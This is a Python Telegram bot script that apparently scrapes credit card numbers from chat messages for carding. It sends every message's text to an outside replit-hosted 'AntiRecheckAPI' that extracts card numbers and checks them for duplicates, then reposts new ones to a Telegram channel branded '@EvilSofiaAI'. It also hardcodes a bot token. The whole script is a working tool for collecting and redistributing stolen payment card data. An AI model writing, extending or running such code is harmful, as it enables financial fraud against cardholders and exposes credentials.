#!/usr/bin/env python
# -*- coding: utf-8 -*-


import re
import os
import sys
import logging
import requests
from luhn import *
from telegram.ext.dispatcher import run_async
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters

posting_channel = input("-1001720040009")

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
					level=logging.INFO)

logger = logging.getLogger(__name__)

class DB_Connection:

	__slots__ = ['connection_text']


	def __init__(self, connection_text: str) -> str:

		self.connection_text = connection_text

	@property
	def database_search(self) ->  dict:

		try:
			searchbynum = bool(re.findall(r'[0-9]', self.connection_text))

			if searchbynum:
				query_db = requests.post(
					'https://plumpdisloyalwatch.jackson0575.repl.co/AntiRecheckAPI/',
					data={
						'text_card_query': self.connection_text
					}
				).json()

				

				if query_db['Input_CC'] != "NO CC!":
					if query_db['Result'] == False:

						return {'cc': query_db['Input_CC'], 'post': True}
					else:
						return {'cc': query_db['Input_CC'], 'post': False}
				else:
					return {'cc': query_db['Input_CC'], 'post': False}
			else:
				return {'cc': 'no data logs', 'post': False}
		except Exception as e:

			print(str(e))
			return False

developers = ['878216403']

@run_async
def extrct(update, context):
	
	obo = update.message.text

	print(obo)
	

	try:
		check_card_bog_network = DB_Connection(str(obo)).database_search
		if check_card_bog_network['post']:



	

			card_beautiful_send = f'''
CC: {check_card_bog_network["cc"]}

⚠️All Our Automate Network has powered by @EvilSofiaAI
					'''
			context.bot.send_message(
				chat_id=posting_channel,
				text=card_beautiful_send,
				parse_mode='HTML'
			)
	except Exception as e:	
		print(str(e))

def main():

	tk = '5186970159:AAEMvuQc4lKvHsvZNsPVKPq968Nc3NWECLE' #Put here ur bot token 
	
	updater = Updater(tk, use_context=True)
	dp = updater.dispatcher

	dp.add_handler(MessageHandler(Filters.text, extrct))


	updater.start_polling()
	updater.idle()


if __name__ == '__main__':
	
	main()

